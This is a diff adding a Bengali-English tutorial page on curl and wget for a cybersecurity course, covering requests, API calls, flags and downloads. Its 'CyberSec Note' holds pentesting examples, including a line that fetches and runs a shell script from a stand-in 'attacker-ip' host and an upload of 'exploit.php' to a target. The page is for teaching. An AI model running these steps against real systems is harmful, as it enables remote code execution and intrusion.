@@ -1,0 +1,168 @@
+---
+title: curl & wget
+description: Terminal থেকে HTTP requests পাঠাও আর files download করো।
+---
+
+import { Callout, Tabs } from 'nextra/components'
+
+# curl & wget
+
+<Callout type="info">
+  Browser ছাড়া terminal থেকে websites-এ request পাঠানো, API call করা, files download করা — এই দুটো tool দিয়ে সব হয়। Penetration testing আর CTF-এ এগুলো অনেক বেশি লাগে।
+</Callout>
+
+## curl vs wget
+
+| | curl | wget |
+|-|------|------|
+| Main use | HTTP requests, APIs | File download |
+| Protocol support | HTTP, HTTPS, FTP, SCP... | HTTP, HTTPS, FTP |
+| Output | Terminal-এ print করে | File-এ save করে |
+| Recursive download | না | হ্যাঁ |
+| API testing | Best | না |
+
+---
+
+## `curl`
+
+HTTP request পাঠাও আর response দেখো।
+
+```bash filename="Terminal"
+# GET request — page content দেখো
+curl https://example.com
+
+# Response headers দেখো
+curl -I https://example.com
+
+# Headers + body দুটোই
+curl -i https://example.com
+
+# Output file-এ save করো
+curl -o output.html https://example.com
+curl -O https://example.com/file.zip
+
+# Follow redirects
+curl -L https://short.url/abc
+
+# Verbose mode — পুরো request/response দেখো
+curl -v https://example.com
+
+# Silent mode — progress bar দেখাবে না
+curl -s https://example.com
+```
+
+### API Requests
+
+```bash filename="Terminal"
+# GET request
+curl https://api.example.com/users
+
+# POST request with JSON
+curl -X POST https://api.example.com/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"pass123"}'
+
+# Custom headers
+curl -H "Authorization: Bearer TOKEN" https://api.example.com/data
+
+# PUT request
+curl -X PUT https://api.example.com/user/1 \
+  -H "Content-Type: application/json" \
+  -d '{"name":"Omar"}'
+
+# DELETE request
+curl -X DELETE https://api.example.com/user/1
+```
+
+### Useful Flags
+
+| Flag | কাজ |
+|------|-----|
+| `-X` | HTTP method specify (GET, POST, PUT, DELETE) |
+| `-H` | Custom header add করো |
+| `-d` | Request body data |
+| `-o` | Output filename specify করো |
+| `-O` | Original filename-এ save করো |
+| `-L` | Redirects follow করো |
+| `-I` | শুধু headers দেখো |
+| `-s` | Silent mode |
+| `-v` | Verbose output |
+| `-k` | SSL certificate ignore করো |
+
+---
+
+## `wget`
+
+File download-এর জন্য সবচেয়ে reliable tool।
+
+```bash filename="Terminal"
+# File download করো
+wget https://example.com/file.zip
+
+# নাম দিয়ে save করো
+wget -O myfile.zip https://example.com/file.zip
+
+# Background-এ download
+wget -b https://example.com/largefile.iso
+
+# Resume interrupted download
+wget -c https://example.com/largefile.iso
+
+# Download speed limit
+wget --limit-rate=500k https://example.com/file.zip
+
+# Multiple files download
+wget -i urls.txt
+# urls.txt এ প্রতি line-এ একটা URL
+```
+
+---
+
+## CyberSec Note
+
+<Callout type="warning">
+  **curl আর wget pentesting-এ:**
+
+  ```bash
+  # Server technology detect করো
+  curl -I https://target.com
+  # Server: nginx/1.18.0
+
+  # Robots.txt পড়ো — hidden paths পাওয়া যায়
+  curl https://target.com/robots.txt
+
+  # Directory bruteforce-এ API endpoint test করো
+  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin
+  # 200 = exists, 404 = not found, 403 = forbidden
+
+  # Reverse shell download করো target machine-এ
+  wget http://attacker-ip/shell.sh -O /tmp/shell.sh
+  chmod +x /tmp/shell.sh
+  /tmp/shell.sh
+
+  # File upload via curl
+  curl -F "file=@exploit.php" https://target.com/upload
+
+  # SSL certificate ignore (self-signed)
+  curl -k https://internal-app.local
+  ```
+
+  TryHackMe-তে প্রায়ই `wget` দিয়ে exploit download করতে হয় target machine-এ, আর `curl` দিয়ে API endpoints test করতে হয়।
+</Callout>
+
+---
+
+## Quick Check
+
+- [ ] `curl` আর `wget` এর মূল ব্যবহারের পার্থক্য কী?
+- [ ] `curl -I` কী দেখায়?
+- [ ] POST request পাঠাতে curl-এ কোন flags লাগে?
+- [ ] Interrupted download resume করতে wget-এ কোন flag?
+
+এই section শেষ।
+
+**পরবর্তী Section →** [Package Management](/docs/linux-fundamentals/08-package-management)
+
+<span style={{ display: 'none' }}>
+  Search Keywords: linux curl wget, curl POST request, wget download, curl API testing, curl headers, wget resume download, curl cybersecurity
+</span>
